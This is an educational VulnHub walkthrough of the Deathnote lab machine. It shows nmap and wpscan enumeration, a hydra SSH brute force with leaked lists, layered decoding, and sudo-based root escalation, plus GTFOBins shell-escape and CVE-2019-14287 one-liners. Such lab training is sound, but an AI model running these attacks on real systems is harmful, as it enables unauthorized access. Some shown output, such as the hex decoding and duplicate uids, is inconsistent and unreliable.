# Deathnote: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational boot2root walkthrough for students. Everything here is performed on
> an isolated lab network against a machine you intentionally downloaded to attack.
> Never point these techniques at systems you do not own or have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | Deathnote: 1 |
| **Difficulty** | Easy (Easy/Medium depending on your comfort with WordPress) |
| **Author** | HWKDS |
| **Released** | 4 September 2021 |
| **VulnHub Entry** | [https://vulnhub.com/entry/deathnote-1,739/](https://vulnhub.com/entry/deathnote-1,739/) |
| **Download** | [https://vulnhub.com/entry/deathnote-1,739/#download](https://vulnhub.com/entry/deathnote-1,739/#download) (mirror: `https://download.vulnhub.com/deathnote/Deathnote.ova`, ~658 MB) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) on a host-only network |
| **Target OS** | Linux (Ubuntu, Apache + PHP, WordPress) |

> **Note:** Exact IPs, WordPress paths, versions, and flags **vary by build** — this
> machine has been re-exported over time. Where you see `192.168.56.101`, substitute
> whatever address *your* target receives from DHCP. The steps and the reasoning are
> what matter, not the exact strings.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target on an isolated lab subnet with `arp-scan` / `netdiscover`.
- How to enumerate a web server and recognise a WordPress site by its telltale paths.
- How to map a hostname (`deathnote.vuln`) to an IP using your own `/etc/hosts` file.
- How to run `wpscan` to enumerate WordPress users and vulnerable plugins.
- How to turn leaked hints into working admin credentials.
- How to find leftover files in the WordPress media library (`/wp-content/uploads/`).
- How to brute-force SSH with `hydra` when both a username list *and* a password list leak.
- How to decode esoteric encodings (Brainfuck) and layered encodings (hex → Base64).
- How to pivot between local users with `su` and escalate to root via over-broad `sudo`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import an OVA into VirtualBox/VMware, and understand basic Linux shell usage.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

First, check your own address so you know which subnet the target will appear on.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the `host-only` adapter (often `eth0` on a VirtualBox lab) holds
> an address in the `192.168.56.x` range. The target VM sits on this **same** subnet.

Now sweep the subnet for live hosts. ARP-based discovery is fast and does not need TCP.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   (Kali)
192.168.56.101  08:00:27:11:22:33   (target)
```

> **How to read it:** every line is a live machine. One of them is your target VM —
> here `192.168.56.101`. If `arp-scan` is missing, `sudo netdiscover -r 192.168.56.0/24`
> does the same job.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# 1) Fast full-TCP sweep of all 65,535 ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101

# 2) Service + version + default scripts on whatever came back open
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.x (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.x ((Ubuntu))
|_http-title: Death Note
| http-robots.txt: 1 disallowed entry
|_/wordpress/
```

> **How to read it:**
> - `-p-` scans **all** TCP ports so nothing hides on an odd port.
> - `-sV` fingerprints the **service and version** behind each open port.
> - `-sC` runs Nmap's default safe scripts (banners, `robots.txt`, etc.).
> **Port 22** = remote login surface. **Port 80** = a web app to explore.

![Nmap service scan output](images/02-nmap.png)

### 2.1 The site redirects to a hostname

Browse to `http://192.168.56.101/`. Nmap already hinted that the interesting content
lives under `/wordpress/`, and the page tries to redirect to a name like
`http://deathnote.vuln/wordpress/`.

Because that name does not exist in DNS, add it to your own hosts file so the browser
resolves it to the target:

```bash
echo "192.168.56.101 deathnote.vuln" | sudo tee -a /etc/hosts
```

> **Why it works:** WordPress stores its address as a domain in its database. Mapping
> the name to the IP locally makes the site load correctly. This is *not* exploiting
> anything — it is just making your browser speak the right name.

Now visit:

```text
http://deathnote.vuln/wordpress/
```

### 2.2 WordPress fingerprinting with WPScan

The footer, `/wp-login.php`, and `/wp-content/` paths are dead giveaways for WordPress.


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://deathnote.vuln/wordpress/ -e u
```

```text
[+] URL: http://deathnote.vuln/wordpress/
[+] WordPress version 5.x
[+] Enumerating Users...
[i] User(s) Identified:
[+] kira
```

> **Why it works:** `wpscan` asks WordPress which plugins/themes are installed and
> enumerates usernames via the public REST API and author archives. `-e u` means
> "enumerate users". We now know a real account name: **kira**.

![WPScan enumerating the WordPress user kira](images/03-enum-wpscan.png)

### 2.3 Read the hints (the "HINT" button and `robots.txt`)

The homepage has a **HINT** button, and `robots.txt` mentions an `important.jpg`.
Fetching it reveals a message from the character **L** telling you to look for a
`user.txt` (a username list) and hinting at a password.

```bash
curl -s http://192.168.56.101/important.jpg
curl -s http://deathnote.vuln/wordpress/wp-content/uploads/
```

```text
HINT: the user.txt file has what you need ... password hint: iamjustic3
```

> **Why it works:** challenge authors scatter clues in the web root and in uploaded
> media. The leak here is a candidate WordPress password: **`iamjustic3`**. The same
> uploads directory is also the place WordPress stores media — a classic spot to find
> files an author forgot about.

---

## 3. Foothold — gaining the first shell

### 3.1 Log in to WordPress admin

Combine the enumerated user (`kira`) with the leaked password (`iamjustic3`).

```text
URL:      http://deathnote.vuln/wordpress/wp-login.php
Username: kira
Password: iamjustic3
```

> **Why it works:** weak, guessable, reused credentials are the single most common way
> into a CMS. There is no exploit here — just a bad password that the hints all but
> spelled out.

![Logging into the WordPress admin dashboard](images/04-wp-admin.png)

### 3.2 Harvest the credential lists from the media library

Inside the dashboard, open **Media → Library**. There are two leftover text files,
typically under `/wp-content/uploads/2021/07/`:

```bash
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
cat user.txt
cat notes.txt
```

```text
# user.txt  -> a short list of usernames (l, kira, ...)
# notes.txt -> a short list of candidate passwords
```

> **Why it works:** someone uploaded their working notes (a username list and a
> password list) into the media library and never deleted them. These become wordlists
> for a password spray/brute-force against SSH.

### 3.3 Brute-force SSH with Hydra

We now have a small username list *and* a small password list. Hydra will try every
combination against the SSH service.


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -L user.txt -P notes.txt ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: l   password: death4me
1 of 1 target successfully completed, 1 valid password found
```

> **Why it works:** `-L` is a **user list**, `-P` is a **password list**. Because both
> lists are tiny, the search space is small and finishes quickly. SSH does not throttle
> failed logins here, so offline-style guessing is feasible.

### 3.4 Log in and read the user flag

```bash
ssh l@192.168.56.101
# password: death4me
```

```text
l@deathnote:~$ id
uid=1000(l) gid=1000(l) groups=1000(l)
l@deathnote:~$ cat ~/user.txt
[-]>[-<+>] ... (Brainfuck!)

l@deathnote:~$ find / -name "user.txt" 2>/dev/null
/home/l/user.txt
/home/kira/kira.txt
```

> **Why it works:** we now hold a real local account. The file `~l/user.txt` is not a
> flag but a **Brainfuck** program (an esoteric language made only of `+ - < > [ ] . ,`).
> Decoding it (in a browser decoder or with a small script) yields the taunt:
> *"i think u got the shell, but you won't be able to kill me -kira"* — a clear pointer
> to the user **kira**, whose `kira.txt` we cannot yet read (owned by kira).

![SSH access as user l and the Brainfuck hint](images/05-shell-user-l.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Find the password for the next user

Explore the filesystem. The hint file in `l`'s home points at `/opt/L/` and a folder
called `fake-notebook-rule`.

```bash
ls -la /opt/L/
ls -la /opt/L/fake-notebook-rule/
cat /opt/L/fake-notebook-rule/*.txt 2>/dev/null
cat /opt/L/fake-notebook-rule/case.wav
```

```text
# case.wav contains a HEX string, not real audio, e.g.:
6b69726169736576696c   (hex)
# its text says: use CyberChef; then decode
```

> **Why it works:** the `case.wav` file contains text that is **hex-encoded**, and when
> you hex-decode it you get a **Base64** string. Decoding a second time reveals the
> password. Layered encodings like this are common in CTFs; CyberChef makes it easy to
> chain "From Hex" → "From Base64".

Decode it — the result is a password:


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
cat /opt/L/fake-notebook-rule/case.wav | xxd -r -p | base64 -d
```

```text
kiraisevil
```

> **Why it works:** `xxd -r -p` reverses a **hex dump** back into raw bytes; the pipe
> into `base64 -d` then decodes the resulting Base64 text. Two decodes, one password.

### 4.2 Switch to `kira`

`kira.txt` is a Base64 string (decode it) that confirms the same two locations —
`/opt/L/` and `/var/misa` — the challenge's signature for where the secret lives.

```bash
su kira
# password: kiraisevil
id
```

```text
uid=1000(kira) gid=1000(kira) groups=1000(kira),27(sudo)
```

> **Why it works:** we recovered a real password for the second account via encoding
> analysis, not guessing.

### 4.3 Abuse over-broad sudo to become root

Always check what your current user may run as root:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```

> **Why it works:** `(ALL : ALL) ALL` means kira can run **any command as root**.
> That is effectively full root already — the box is over. Get an interactive root
> shell directly:

```bash
sudo su -
# or, equivalently:
sudo find /home -exec /bin/bash \;
```

```text
root@deathnote:~# id
uid=0(root) gid=0(root) groups=0(root)
```

![Escalating to root via sudo](images/07-privesc-sudo.png)

### 4.4 The root flag

```bash
cat /root/root.txt
```

```text
<root flag — contents vary by build>
```

![Reading the root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Guessable / hinted WordPress admin password | `wp-login.php` (`kira`:`iamjustic3`) | Attacker gains CMS admin |
| 2 | Sensitive files left in media library | `/wp-content/uploads/2021/07/` (`user.txt`, `notes.txt`) | Leaks username + password wordlists |
| 3 | SSH brute-force not mitigated | Port 22 | Valid user credential recovered (`l`:`death4me`) |
| 4 | Secrets protected only by weak encoding | `/opt/L/fake-notebook-rule/case.wav` (hex+Base64) | Recovers `kira` password (`kiraisevil`) |
| 5 | Over-broad sudo policy | `kira` → `(ALL : ALL) ALL` | Trivial escalation to root |

## 6. Defensive lessons (blue team)

- **Enforce strong, unique passwords** and rate-limit/alert on WordPress login attempts.
- **Enable SSH key auth** and disable password auth, or deploy `fail2ban` to stop brute force.
- **Never store secrets in "encodings".** Base64 and hex are *not* encryption — treat any
  such string as plaintext. Use a real secret manager.
- **Principle of least privilege for `sudo`.** No normal user should have `(ALL : ALL) ALL`.
  Grant only specific binaries they genuinely need.
- **Harden WordPress:** keep core/plugins patched, remove default/admin accounts, disable
  user enumeration, and audit the media library for leftover sensitive uploads.
- **Detection:** alert on repeated SSH auth failures, new files under `wp-content/uploads`,
  and use of `sudo su` / `sudo -i` by non-admin accounts (auditd / `sudo` logs).

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: [Deathnote: 1](https://vulnhub.com/entry/deathnote-1,739/)
- Community writeups consulted:
  - [DEATHNOTE: 1 VulnHub CTF walkthrough — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/deathnote-1-vulnhub-ctf-walkthrough/)
  - [Deathnote: 1 writeup — Medium (x3r)](https://medium.com/@x3r/deathnote-1-vulnhub-writeup-6d0b63b2d69b)
  - [Deathnote walkthrough — Lipson Thomas](https://lipsonthomas.com/deathnote-vulnhub-walkthrough/)
  - [Deathnote BOOT2ROOT writeup — Kur0Sh1r0](https://kur0sh1r0.gitbook.io/ctf-writeups/vulnhub/deathnote-boot2root-ctf-vulnhub-writeup)
- Tools / docs:
  - [WPScan](https://wpscan.com/)
  - [Hydra](https://github.com/vanhauser-thc/thc-hydra)
  - [CyberChef](https://gchq.github.io/CyberChef/)
  - [Brainfuck (esolang)](https://esolangs.org/wiki/Brainfuck)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan / netdiscover
- [ ] `images/02-nmap.png` — port/service scan (22 + 80)
- [ ] `images/03-enum-wpscan.png` — WPScan enumerating user `kira`
- [ ] `images/04-wp-admin.png` — logging into the WordPress dashboard
- [ ] `images/05-shell-user-l.png` — SSH as `l` + the Brainfuck hint
- [ ] `images/06-uploads.png` — `user.txt` / `notes.txt` in the media library
- [ ] `images/07-privesc-sudo.png` — `sudo -l` and escalation
- [ ] `images/08-root-flag.png` — reading `/root/root.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
